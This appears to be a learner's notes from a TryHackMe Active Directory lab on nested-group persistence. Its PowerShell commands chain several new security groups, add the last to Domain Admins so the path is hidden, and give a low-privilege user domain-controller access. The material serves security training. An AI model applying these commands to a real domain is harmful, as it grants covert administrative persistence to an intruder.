Sometimes, the highest group / membership is not the best one for persistence.
It's where all the security lies, so why not go somewhere else?
Maybe a bit lower?

For example, a nested group!
Take a group like a local IT support group. There are loads of nested
groups within a big organisation. Pick one, and add yourself!

Help desk, access card manangers, network managers. Loads of groups.

For example, we can make a new group within People > IT Organisational Unit (OU)
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security

Then, we can create another group inside of people > sales ou and then add 
our previous group as a member to it:
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"


We could then add them to more, and more nesting groups. Just keep on stacking, stacking, stacking.
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"
New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"

Now, with our last group, we can add that to our Domain Admins group:
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"

Now, we can add our low privilege AD user to the first group we created:
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"

Now, your AD User should have the privilege to access to the Domain Controller.
Check with the following command:
dir \\thmdc.za.tryhackme.loc\c$\ 

We can also check that even though we have a load of groups, the domain admins group
only has one new member:
Get-ADGroupMember -Identity "Domain Admins"

If this was a real organisation, we would not be creating new groups to nest.
We would be making use of the existing groups, and chaining them together
to perform nesting.

This is something that is never normally done within a red team assessment
because it ends up breaking the Organisation's AD structure, and can be
super annoying and can end up in a full Domain Rebuild.

It's just adding a member to the first group, then adding the first group
to the second group, etc etc. Very funny, and very annoying.
